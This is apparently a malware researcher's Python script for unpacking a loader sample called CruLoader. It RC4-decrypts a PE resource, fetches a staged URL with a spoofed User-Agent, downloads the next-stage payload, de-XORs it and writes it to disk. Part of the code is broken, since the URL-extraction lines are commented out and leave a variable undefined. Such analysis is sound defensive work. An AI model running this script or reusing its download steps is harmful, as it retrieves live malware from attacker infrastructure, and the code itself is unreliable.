#!/usr/bin/env python3
# WHat? Who needs error handling?

import malduck
import sys
import re
import requests

infile = sys.argv[1]
outfile = infile + "_decrypted"
url_regexp = re.compile(r'\b(http|https)+://+((xn--)?[a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}b', re.I)

# RC4 key offset at 0xC
key_offset = 12

# RC4 key size
key_size = 15

# RC4 decrypt the first layer of CruLoader
p = malduck.pe(open(infile, "rb").read(), fast_load=False)
get_rsrc = p.resource(101)
rc4_key = get_rsrc[key_offset:key_offset+key_size]
encrypted = get_rsrc[28:]
decrypted = malduck.rc4(rc4_key, encrypted)
convert_rol = (decrypted[0:2])

for index,value in enumerate(convert_rol):
	 a = malduck.rol(value, 4, bits=8)
	 
#dexor = malduck.xor(0x61, a)
#print(dexor)

#get_urls = url_regexp.finditer(decrypted)

#for matched_value in get_urls:
#	matched_url = (matched_value.group())

#URL found in CruLoader sample
url = matched_url

#Change the User-Agent to look less suspicius
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36'
}

r = requests.get(f'{url}', headers=headers)

first_response = r.content.decode('utf-8')

#Parse the data from the Pastebin webpage and send a new request
new_url = first_response
n = requests.get(f'{new_url}', headers=headers)
payload = n.content

# De-XOR payload
key = 0x61
payload = payload
decrypted = malduck.xor(key, payload)

# Todo trim de-XOR:ed MZ file. For now I am piping the download payload througth "cut-bytes.py '[4D5A90]':" from Didier Stevens.

# Write payload to disk
with open ("final_payload.bin", 'wb') as o:
	o.write(decrypted)
